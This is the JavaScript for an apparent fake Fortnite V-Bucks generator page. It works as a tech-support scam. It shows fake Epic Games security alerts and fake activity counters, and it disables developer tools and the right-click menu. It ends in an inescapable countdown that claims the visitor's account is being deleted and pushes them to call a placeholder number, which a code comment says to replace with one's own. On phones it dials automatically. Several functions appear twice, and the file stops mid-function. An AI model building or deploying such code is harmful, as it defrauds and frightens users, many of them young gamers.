document.addEventListener('DOMContentLoaded', function() {
    initCountdown();
    initVBucksCounter();
    initGenerationList();
    
    const navLinks = document.querySelectorAll('.nav-link');
    const vbucksBalance = document.querySelector('.vbucks-balance');
    const userDropdown = document.querySelector('.user-dropdown');
    const generateBtns = document.querySelectorAll('.generate-btn');
    const footerLinks = document.querySelectorAll('.footer-links a');
    const verifiedBadge = document.querySelector('.verified-badge');
    const launcherBtn = document.querySelector('.launcher-btn');
    const topLinks = document.querySelectorAll('.top-link');
    const signInBtn = document.querySelector('.sign-in-btn');
    const downloadBtn = document.querySelector('.download-btn');
    
    const errorCodes = [
        'FORTNITE-ERR-0x80004005',
        'EPIC-SUSPEND-0x80240017',
        'VBUCKS-FRAUD-0x800F0984',
        'SECURITY-BREACH-0x80070005',
        'TOS-VIOLATION-0x80070422',
        'PAYMENT-ERROR-0x8007000D'
    ];
    
    // Modify to your own numbers.
    const supportNumbers = [
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000'
    ];
    
    init();
    
    function init() {
        setupEventListeners();
        addDynamicEffects();
        
        setTimeout(() => {
            if (Math.random() > 0.3) {
                showFortniteErrorModal();
            }
        }, Math.random() * 30000 + 10000);
    }
    
    function setupEventListeners() {
        navLinks.forEach(link => {
            if (!link.classList.contains('active')) {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    showAccountSecurityError();
                });
            }
        });
        
        if (vbucksBalance) {
            vbucksBalance.addEventListener('click', function(e) {
                e.preventDefault();
                showVBucksError();
            });
        }
        
        if (userDropdown) {
            userDropdown.addEventListener('click', function(e) {
                e.preventDefault();
                showLoginError();
            });
        }
        
        if (launcherBtn) {
            launcherBtn.addEventListener('click', function(e) {
                e.preventDefault();
                showLauncherError();
            });
        }
        
        topLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showEpicGamesError();
            });
        });
        
        if (signInBtn) {
            signInBtn.addEventListener('click', function(e) {
                e.preventDefault();
                showLoginError();
            });
        }
        
        if (downloadBtn) {
            downloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                showDownloadError();
            });
        }
        
        generateBtns.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                const packageCard = this.closest('.package-card');
                const vbucksAmount = packageCard.dataset.vbucks;
                showGenerationError(vbucksAmount);
            });
        });
        
        footerLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showFortniteErrorModal();
            });
        });
        
        if (verifiedBadge) {
            verifiedBadge.addEventListener('click', function(e) {
                e.preventDefault();
                showAccountSecurityError();
            });
        }
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                showDevToolsWarning();
                return false;
            }
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            showDevToolsWarning();
            return false;
        });
    }
    
    function showFortniteErrorModal() {
        if (document.querySelector('.fortnite-error-modal')) return;
        
        const randomError = errorCodes[Math.floor(Math.random() * errorCodes.length)];
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        const modal = document.createElement('div');
        modal.className = 'fortnite-error-modal';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 15000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.85);
            animation: fadeIn 0.3s;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'fortnite-error-content';
        modalContent.style.cssText = `
            background-color: white;
            margin: 8% auto;
            padding: 0;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.6);
            animation: slideIn 0.3s;
            border: 3px solid #f39c12;
        `;
        
        modalContent.innerHTML = `
            <div style="background: linear-gradient(135deg, #f39c12, #e67e22); color: white; padding: 20px; border-radius: 12px 12px 0 0; text-align: center;">
                <h3 style="margin: 0; font-weight: 600; font-size: 18px;">
                    🛡️ Epic Games Security Alert
                </h3>
            </div>
            <div style="padding: 32px; text-align: center; color: #393b3d;">
                <div style="color: #f39c12; font-size: 64px; margin-bottom: 20px;">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <h4 style="margin-bottom: 16px; color: #2c3e50; line-height: 1.4;">
                    Suspicious V-Bucks Activity Detected
                </h4>
                <p style="margin-bottom: 16px; line-height: 1.5; font-size: 15px;">
                    Error Code: <strong style="color: #e74c3c;">${randomError}</strong>
                </p>
                <p style="margin-bottom: 20px; font-size: 14px;">
                    Your Fortnite account has been flagged for unusual V-Bucks generation activity. 
                    To prevent account suspension, please verify your identity immediately.
                </p>
                <div style="background: #f8f9fa; border-radius: 8px; padding: 16px; margin: 20px 0; border-left: 4px solid #f39c12;">
                    <div style="font-size: 14px; margin-bottom: 8px; font-weight: bold; color: #2c3e50;">Epic Games Support:</div>
                    <div style="font-size: 20px; font-weight: bold; color: #f39c12; margin-bottom: 8px;">
                        ${randomPhone}
                    </div>
                    <div style="font-size: 12px; color: #7f8c8d;">
                        Available 24/7 for account security issues
                    </div>
                </div>
                <div style="padding: 20px 0;">
                    <button onclick="handleCallNow('${randomPhone}')" 
                            style="background: #f39c12; color: white; border: none; padding: 12px 24px; 
                                   border-radius: 6px; cursor: pointer; font-weight: bold; margin-right: 10px;">
                        Call Support
                    </button>
                    <button onclick="handleIgnoreWarning()" 
                            style="background: #ecf0f1; color: #2c3e50; border: none; padding: 12px 24px; 
                                   border-radius: 6px; cursor: pointer;">
                        Close
                    </button>
                </div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            modal.classList.add('urgent');
        }, 2000);
        
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                handleIgnoreWarning();
            }
        });
        
        idleTimer = setTimeout(() => {
            if (!isCountdownActive && document.querySelector('.fortnite-error-modal')) {
                isCountdownActive = true;
                modal.remove();
                document.body.style.overflow = 'auto';
                setTimeout(() => {
                    startForcedAccountDeletionCountdown();
                }, 1000);
            }
        }, 45000);
    }
    
    function showAccountSecurityError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Account Security Alert', 
            'Your Epic Games account requires immediate verification. Unauthorized access detected from multiple locations.',
            randomPhone);
    }
    
    function showVBucksError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('V-Bucks Balance Error', 
            'Unable to display V-Bucks balance. Your account may have been compromised.',
            randomPhone);
    }
    
    function showLoginError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Authentication Error', 
            'Your Epic Games login session has expired. Please verify your account to continue.',
            randomPhone);
    }
    
    function showGenerationError(vbucksAmount) {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('V-Bucks Generation Failed', 
            `Unable to generate ${vbucksAmount} V-Bucks. Account verification required to proceed.`,
            randomPhone);
    }
    
    function showLauncherError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Epic Games Launcher Error', 
            'Unable to launch Fortnite. Your Epic Games account requires immediate verification.',
            randomPhone);
    }
    
    function showEpicGamesError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Epic Games Store Access Denied', 
            'Access to Epic Games Store has been restricted. Account verification required.',
            randomPhone);
    }
    
    function showDownloadError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Download Security Alert', 
            'Download blocked due to security concerns. Your account may have been compromised.',
            randomPhone);
    }
    
    function showDevToolsWarning() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Developer Tools Detected', 
            'For security reasons, developer tools are disabled. Your account activity is being monitored.',
            randomPhone);
    }
    
    function showSecurityModal(title, message, phoneNumber) {
        if (document.querySelector('.fortnite-error-modal')) return;
        
        const modal = document.createElement('div');
        modal.className = 'fortnite-error-modal';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 15000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            animation: fadeIn 0.3s ease-out;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'fortnite-error-content';
        modalContent.style.cssText = `
            background: #ffffff;
            margin: 5% auto;
            padding: 0;
            border-radius: 16px;
            width: 95%;
            max-width: 520px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(231, 76, 60, 0.8);
            animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            overflow: hidden;
            position: relative;
        `;
        
        modalContent.innerHTML = `
            <div style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); 
                        color: white; 
                        padding: 24px; 
                        text-align: center;
                        position: relative;">
                <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                           background: repeating-linear-gradient(
                               45deg,
                               transparent,
                               transparent 10px,
                               rgba(255,255,255,0.05) 10px,
                               rgba(255,255,255,0.05) 20px
                           );
                           opacity: 0.6;"></div>
                <h3 style="margin: 0; font-weight: 700; font-size: 20px; position: relative; z-index: 2;
                           text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
                    🚨 ${title}
                </h3>
            </div>
            <div style="padding: 40px 32px; text-align: center; color: #2c3e50; background: #ffffff;">
                <div style="color: #e74c3c; font-size: 72px; margin-bottom: 24px; 
                           filter: drop-shadow(0 4px 8px rgba(231, 76, 60, 0.3));">
                    <svg width="72" height="72" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2L1 21h22L12 2zm0 3.5L19.53 19H4.47L12 5.5z"/>
                        <circle cx="12" cy="15.5" r="1.5"/>
                        <path d="M11 10h2v4h-2z"/>
                    </svg>
                </div>
                <p style="margin-bottom: 24px; line-height: 1.6; font-size: 16px; color: #34495e;">
                    ${message}
                </p>
                <div style="background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); 
                           border-radius: 12px; 
                           padding: 20px; 
                           margin: 24px 0; 
                           border: 1px solid #dee2e6;
                           box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                    <div style="font-size: 15px; margin-bottom: 12px; font-weight: 600; color: #2c3e50;">
                        🛡️ Epic Games Emergency Support:
                    </div>
                    <div style="font-size: 28px; font-weight: 800; color: #e74c3c; margin-bottom: 12px;
                               text-shadow: 0 2px 4px rgba(231, 76, 60, 0.2);">
                        ${phoneNumber}
                    </div>
                    <div style="font-size: 13px; color: #6c757d; font-weight: 500;">
                        📞 Call immediately to secure your account
                    </div>
                </div>
                <div style="padding: 20px 0;">
                    <button onclick="handleCallNow('${phoneNumber}')" 
                            style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); 
                                   color: white; 
                                   border: none; 
                                   padding: 14px 28px; 
                                   border-radius: 8px; 
                                   cursor: pointer; 
                                   font-weight: 700; 
                                   margin-right: 12px;
                                   font-size: 14px;
                                   text-transform: uppercase;
                                   letter-spacing: 0.5px;
                                   box-shadow: 0 4px 12px rgba(231, 76, 60, 0.4);
                                   transition: all 0.3s ease;
                                   transform: translateY(0);">
                        📞 CALL NOW
                    </button>
                    <button onclick="handleIgnoreWarning()" 
                            style="background: #95a5a6; 
                                   color: white; 
                                   border: none; 
                                   padding: 14px 28px; 
                                   border-radius: 8px; 
                                   cursor: pointer;
                                   font-weight: 600;
                                   font-size: 14px;
                                   text-transform: uppercase;
                                   letter-spacing: 0.5px;
                                   transition: all 0.3s ease;
                                   transform: translateY(0);">
                        DISMISS
                    </button>
                </div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            modal.classList.add('urgent');
        }, 2000);
        
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                handleIgnoreWarning();
            }
        });
        
        idleTimer = setTimeout(() => {
            if (!isCountdownActive && document.querySelector('.fortnite-error-modal')) {
                isCountdownActive = true;
                modal.remove();
                document.body.style.overflow = 'auto';
                setTimeout(() => {
                    startForcedAccountDeletionCountdown();
                }, 1000);
            }
        }, 45000);
    }
    
    function showAccountSecurityError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Account Security Alert', 
            'Your Epic Games account requires immediate verification. Unauthorized access detected from multiple locations.',
            randomPhone);
    }
    
    function showVBucksError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('V-Bucks Balance Error', 
            'Unable to display V-Bucks balance. Your account may have been compromised.',
            randomPhone);
    }
    
    function showLoginError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Authentication Error', 
            'Your Epic Games login session has expired. Please verify your account to continue.',
            randomPhone);
    }
    
    function showGenerationError(vbucksAmount) {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('V-Bucks Generation Failed', 
            `Unable to generate ${vbucksAmount} V-Bucks. Account verification required to proceed.`,
            randomPhone);
    }
    
    function showLauncherError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Epic Games Launcher Error', 
            'Unable to launch Fortnite. Your Epic Games account requires immediate verification.',
            randomPhone);
    }
    
    function showEpicGamesError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Epic Games Store Access Denied', 
            'Access to Epic Games Store has been restricted. Account verification required.',
            randomPhone);
    }
    
    function showDownloadError() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Download Security Alert', 
            'Download blocked due to security concerns. Your account may have been compromised.',
            randomPhone);
    }
    
    function showDevToolsWarning() {
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        showSecurityModal('Developer Tools Detected', 
            'For security reasons, developer tools are disabled. Your account activity is being monitored.',
            randomPhone);
    }
    
    function showSecurityModal(title, message, phoneNumber) {
        if (document.querySelector('.fortnite-error-modal')) return;
        
        const modal = document.createElement('div');
        modal.className = 'fortnite-error-modal';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 15000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            animation: fadeIn 0.3s ease-out;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'fortnite-error-content';
        modalContent.style.cssText = `
            background: #ffffff;
            margin: 5% auto;
            padding: 0;
            border-radius: 16px;
            width: 95%;
            max-width: 520px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(231, 76, 60, 0.8);
            animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            overflow: hidden;
            position: relative;
        `;
        
        modalContent.innerHTML = `
            <div style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); 
                        color: white; 
                        padding: 24px; 
                        text-align: center;
                        position: relative;">
                <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                           background: repeating-linear-gradient(
                               45deg,
                               transparent,
                               transparent 10px,
                               rgba(255,255,255,0.05) 10px,
                               rgba(255,255,255,0.05) 20px
                           );
                           opacity: 0.6;"></div>
                <h3 style="margin: 0; font-weight: 700; font-size: 20px; position: relative; z-index: 2;
                           text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
                    🚨 ${title}
                </h3>
            </div>
            <div style="padding: 40px 32px; text-align: center; color: #2c3e50; background: #ffffff;">
                <div style="color: #e74c3c; font-size: 72px; margin-bottom: 24px; 
                           filter: drop-shadow(0 4px 8px rgba(231, 76, 60, 0.3));">
                    <svg width="72" height="72" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2L1 21h22L12 2zm0 3.5L19.53 19H4.47L12 5.5z"/>
                        <circle cx="12" cy="15.5" r="1.5"/>
                        <path d="M11 10h2v4h-2z"/>
                    </svg>
                </div>
                <p style="margin-bottom: 24px; line-height: 1.6; font-size: 16px; color: #34495e;">
                    ${message}
                </p>
                <div style="background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); 
                           border-radius: 12px; 
                           padding: 20px; 
                           margin: 24px 0; 
                           border: 1px solid #dee2e6;
                           box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                    <div style="font-size: 15px; margin-bottom: 12px; font-weight: 600; color: #2c3e50;">
                        🛡️ Epic Games Emergency Support:
                    </div>
                    <div style="font-size: 28px; font-weight: 800; color: #e74c3c; margin-bottom: 12px;
                               text-shadow: 0 2px 4px rgba(231, 76, 60, 0.2);">
                        ${phoneNumber}
                    </div>
                    <div style="font-size: 13px; color: #6c757d; font-weight: 500;">
                        📞 Call immediately to secure your account
                    </div>
                </div>
                <div style="padding: 20px 0;">
                    <button onclick="handleCallNow('${phoneNumber}')" 
                            style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); 
                                   color: white; 
                                   border: none; 
                                   padding: 14px 28px; 
                                   border-radius: 8px; 
                                   cursor: pointer; 
                                   font-weight: 700; 
                                   margin-right: 12px;
                                   font-size: 14px;
                                   text-transform: uppercase;
                                   letter-spacing: 0.5px;
                                   box-shadow: 0 4px 12px rgba(231, 76, 60, 0.4);
                                   transition: all 0.3s ease;
                                   transform: translateY(0);">
                        📞 CALL NOW
                    </button>
                    <button onclick="handleIgnoreWarning()" 
                            style="background: #95a5a6; 
                                   color: white; 
                                   border: none; 
                                   padding: 14px 28px; 
                                   border-radius: 8px; 
                                   cursor: pointer;
                                   font-weight: 600;
                                   font-size: 14px;
                                   text-transform: uppercase;
                                   letter-spacing: 0.5px;
                                   transition: all 0.3s ease;
                                   transform: translateY(0);">
                        DISMISS
                    </button>
                </div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            modal.classList.add('urgent');
        }, 2000);
        
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                handleIgnoreWarning();
            }
        });
        
        idleTimer = setTimeout(() => {
            if (!isCountdownActive && document.querySelector('.fortnite-error-modal')) {
                isCountdownActive = true;
                modal.remove();
                document.body.style.overflow = 'auto';
                setTimeout(() => {
                    startForcedAccountDeletionCountdown();
                }, 1000);
            }
        }, 45000);
    }
    
    function addDynamicEffects() {
        setInterval(() => {
            if (Math.random() > 0.9 && !document.querySelector('.fortnite-error-modal')) {
                showFortniteErrorModal();
            }
        }, 40000);
        
        setInterval(() => {
            const timestamps = document.querySelectorAll('.timestamp');
            timestamps.forEach((timestamp, index) => {
                if (timestamp.textContent.includes('minutes ago') && index > 0) {
                    const minutesAgo = Math.floor(Math.random() * 10) + 1;
                    timestamp.textContent = `${minutesAgo} minute${minutesAgo > 1 ? 's' : ''} ago`;
                }
            });
        }, 60000);
    }
    
    const style = document.createElement('style');
    style.textContent = `
        .urgent {
            animation: fortniteBlink 1.5s infinite ease-in-out;
        }
        
        @keyframes fortniteBlink {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.9; transform: scale(1.02); }
        }
        
        @keyframes fortniteShake {
            0%, 100% { transform: translateX(0) scale(1); }
            25% { transform: translateX(-8px) scale(1.01); }
            75% { transform: translateX(8px) scale(1.01); }
        }
        
        .fortnite-error-content.shake {
            animation: fortniteShake 0.6s infinite ease-in-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideIn {
            from { 
                transform: translateY(-100px) scale(0.9); 
                opacity: 0; 
            }
            to { 
                transform: translateY(0) scale(1); 
                opacity: 1; 
            }
        }
        
        /* Button hover effects */
        .fortnite-error-modal button:hover {
            transform: translateY(-2px) !important;
            box-shadow: 0 6px 20px rgba(0,0,0,0.3) !important;
        }
        
        .fortnite-error-modal button:active {
            transform: translateY(0) !important;
        }
        
        /* Responsive design for mobile */
        @media (max-width: 768px) {
            .fortnite-error-content {
                margin: 10% auto !important;
                width: 95% !important;
                max-width: none !important;
            }
            
            .fortnite-error-modal button {
                display: block !important;
                width: 100% !important;
                margin: 8px 0 !important;
            }
        }
    `;
    document.head.appendChild(style);
    
    function initCountdown() {
        const timeElement = document.getElementById('time-left');
        if (!timeElement) return;
        
        function updateCountdown() {
            const now = new Date();
            const midnight = new Date();
            midnight.setHours(24, 0, 0, 0);
            
            const timeDiff = midnight - now;
            
            if (timeDiff > 0) {
                const hours = Math.floor(timeDiff / (1000 * 60 * 60));
                const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
                
                timeElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            } else {
                timeElement.textContent = '00:00:00';
            }
        }
        
        updateCountdown();
        setInterval(updateCountdown, 1000);
    }
    
    function initVBucksCounter() {
        const counterElement = document.getElementById('vbucks-generated');
        if (!counterElement) return;
        
        let currentCount = 5684921;
        
        setInterval(() => {
            const increment = Math.floor(Math.random() * 15) + 5;
            currentCount += increment;
            counterElement.textContent = currentCount.toLocaleString();
        }, Math.random() * 5000 + 3000);
    }
    
    function initGenerationList() {
        const generationList = document.getElementById('generation-list');
        if (!generationList) return;
        
        const usernames = [
            'FortniteNinja123', 'BuildMaster99', 'VictoryRoyale2025', 'SkullTrooper2025',
            'DefaultDancer', 'LootLlama99', 'StormKing2025', 'BattleBusRider',
            'FortnitePro123', 'BuildingQueen', 'ShotgunSpecialist', 'RoyaleWinner'
        ];
        
        const vbucksAmounts = [500, 1000, 1500, 2000, 2800, 3500, 5000, 6500, 10000];
        
        function addGeneration() {
            const username = usernames[Math.floor(Math.random() * usernames.length)];
            const amount = vbucksAmounts[Math.floor(Math.random() * vbucksAmounts.length)];
            
            const generationItem = document.createElement('div');
            generationItem.className = 'generation-item';
            generationItem.innerHTML = `
                <div class="user-avatar">
                    <i class="fas fa-user-circle"></i>
                </div>
                <div class="generation-content">
                    <div class="username">${username}</div>
                    <div class="amount">Generated ${amount.toLocaleString()} V-Bucks</div>
                    <div class="timestamp">Just now</div>
                </div>
            `;
            
            generationList.insertBefore(generationItem, generationList.firstChild);
            
            if (generationList.children.length > 5) {
                generationList.removeChild(generationList.lastChild);
            }
            
            setTimeout(() => {
                const timestamp = generationItem.querySelector('.timestamp');
                if (timestamp) {
                    timestamp.textContent = '1 minute ago';
                }
            }, 60000);
        }
        
        setInterval(addGeneration, Math.random() * 15000 + 10000);
    }
});

function verifyUsername() {
    showVerificationError();
}

function handleCallNow(phoneNumber) {
    if (idleTimer) {
        clearTimeout(idleTimer);
    }
    
    const urgentDiv = document.createElement('div');
    urgentDiv.innerHTML = `
        <div style="background: #e74c3c; color: white; padding: 20px; text-align: center; font-weight: bold; position: fixed; top: 0; left: 0; right: 0; z-index: 25000;">
            🚨 CRITICAL FORTNITE SECURITY ALERT 🚨<br>
            Call immediately: ${phoneNumber}<br>
            <small>Do not close this window or log out of Epic Games</small>
        </div>
    `;
    
    document.body.insertBefore(urgentDiv, document.body.firstChild);
    
    if (/Mobi|Android/i.test(navigator.userAgent)) {
        window.location.href = `tel:${phoneNumber}`;
    }
}

let isCountdownActive = false;
let countdownTimer = null;
let idleTimer = null;

function handleIgnoreWarning() {
    const modal = document.querySelector('.fortnite-error-modal');
    if (!modal) return;
    
    const warningCount = parseInt(localStorage.getItem('fortniteWarningCount') || '0') + 1;
    localStorage.setItem('fortniteWarningCount', warningCount.toString());
    
    modal.remove();
    document.body.style.overflow = 'auto';
    
    if (idleTimer) {
        clearTimeout(idleTimer);
    }
    
    if (!isCountdownActive) {
        isCountdownActive = true;
        setTimeout(() => {
            startForcedAccountDeletionCountdown();
        }, 2000);
    }
}

function startForcedAccountDeletionCountdown() {
    const existingModal = document.querySelector('.fortnite-error-modal');
    if (existingModal) {
        existingModal.remove();
    }
    
    const modal = document.createElement('div');
    modal.className = 'fortnite-error-modal forced-countdown';
    modal.style.cssText = `
        display: block;
        position: fixed;
        z-index: 25000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.98);
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        animation: fadeIn 0.5s ease-out;
        pointer-events: all;
    `;
    
    const modalContent = document.createElement('div');
    modalContent.className = 'fortnite-error-content forced-content shake';
    modalContent.style.cssText = `
        background: #ffffff;
        margin: 2% auto;
        padding: 0;
        border-radius: 16px;
        width: 95%;
        max-width: 600px;
        box-shadow: 0 30px 100px rgba(255, 0, 0, 0.8), 0 0 0 3px #ff0000;
        animation: slideIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), fortniteShake 0.8s infinite ease-in-out;
        overflow: hidden;
        position: relative;
    `;
    
    const randomPhone = '+1-000-000-0000';
    let timeLeft = 180;
    
    function updateCountdownDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        return `${minutes}:${seconds.toString().padStart(2, '0')}`;
    }
    
    modalContent.innerHTML = `
        <div style="background: linear-gradient(135deg, #ff0000 0%, #8b0000 100%); 
                    color: white; 
                    padding: 16px; 
                    text-align: center;
                    position: relative;
                    overflow: hidden;">
            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                       background: repeating-linear-gradient(
                           45deg,
                           transparent,
                           transparent 8px,
                           rgba(255,255,255,0.08) 8px,
                           rgba(255,255,255,0.08) 16px
                       );
                       opacity: 0.7;"></div>
            <h3 style="margin: 0; font-weight: 900; font-size: 16px; position: relative; z-index: 2;
                       text-shadow: 0 2px 4px rgba(0,0,0,0.5); animation: fortniteBlink 1s infinite;
                       text-transform: uppercase; letter-spacing: 1px;">
                🚨 ACCOUNT DELETION IN PROGRESS 🚨
            </h3>
        </div>
        <div style="padding: 24px 20px; text-align: center; color: #2c3e50; background: #ffffff;">
            <div style="color: #ff0000; font-size: 60px; margin-bottom: 16px; 
                       filter: drop-shadow(0 4px 8px rgba(255, 0, 0, 0.5));
                       animation: fortniteBlink 1.2s infinite;">
                ⏱️
            </div>
            
            <div id="forced-countdown-timer" style="font-size: 32px; font-weight: 900; 
                                                   color: #ff0000; margin-bottom: 16px;
                                                   text-shadow: 0 2px 4px rgba(255, 0, 0, 0.3);
                                                   font-family: 'Courier New', monospace;
                                                   background: #000; padding: 12px 20px;
                                                   border-radius: 8px; display: inline-block;
                                                   border: 2px solid #ff0000;">
                ${updateCountdownDisplay()}
            </div>
            
            <p style="margin-bottom: 12px; line-height: 1.3; font-size: 16px; font-weight: 800; color: #e74c3c;
                      text-transform: uppercase; letter-spacing: 0.5px;">
                FORTNITE ACCOUNT BEING DELETED!
            </p>
            <p style="margin-bottom: 16px; font-size: 14px; color: #34495e; line-height: 1.3;">
                Account termination in progress. Call immediately to verify identity and stop deletion.
            </p>
            <div style="background: linear-gradient(135deg, #ff0000 0%, #8b0000 100%); 
                       color: white; 
                       border-radius: 8px; 
                       padding: 16px; 
                       margin: 16px 0;
                       box-shadow: 0 4px 12px rgba(255, 0, 0, 0.5);
                       position: relative;
                       overflow: hidden;">
                <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; 
                           background: repeating-linear-gradient(
                               90deg,
                               transparent,
                               transparent 8px,
                               rgba(255,255,255,0.06) 8px,
                               rgba(255,255,255,0.06) 16px
                           );
                           border-radius: 8px; opacity: 0.8;"></div>
                <div style="font-size: 14px; margin-bottom: 8px; font-weight: 800; position: relative; z-index: 2;
                           text-transform: uppercase; letter-spacing: 1px;">
                    🆘 EMERGENCY HOTLINE:
                </div>
                <div style="font-size: 22px; font-weight: 900; margin-bottom: 8px; position: relative; z-index: 2;
                           text-shadow: 0 2px 4px rgba(0,0,0,0.4); font-family: 'Courier New', monospace;">
                    ${randomPhone}
                </div>
                <div style="font-size: 12px; font-weight: 700; position: relative; z-index: 2;
                           text-transform: uppercase; letter-spacing: 0.5px; animation: fortniteBlink 1.5s infinite;">
                    ⚠️ CALL NOW TO STOP DELETION ⚠️
                </div>
            </div>
            <div style="padding: 16px 0;">
                <button onclick="handleCallNow('${randomPhone}')" 
                        style="background: linear-gradient(135deg, #ff0000 0%, #8b0000 100%); 
                               color: white; 
                               border: none; 
                               padding: 12px 24px; 
                               border-radius: 6px; 
                               cursor: pointer; 
                               font-weight: 900; 
                               text-transform: uppercase; 
                               font-size: 14px;
                               letter-spacing: 1px;
                               box-shadow: 0 4px 12px rgba(255, 0, 0, 0.6);
                               transition: all 0.3s ease;
                               transform: translateY(0);
                               animation: fortniteBlink 2s infinite;">
                    📞 CALL NOW TO STOP DELETION
                </button>
            </div>
            <div style="margin-top: 12px; padding: 10px; background: #fff3cd; border: 1px solid #ffc107;
                       border-radius: 4px; color: #856404; font-size: 11px; font-weight: 600;">
                ⚠️ All V-Bucks, skins, and progress will be permanently lost at 0:00
            </div>
        </div>
    `;
    
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    modal.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            e.preventDefault();
            e.stopPropagation();
        }
    });
    
    countdownTimer = setInterval(() => {
        timeLeft--;
        const timerElement = document.getElementById('forced-countdown-timer');
        if (timerElement) {
            timerElement.textContent = updateCountdownDisplay();
            
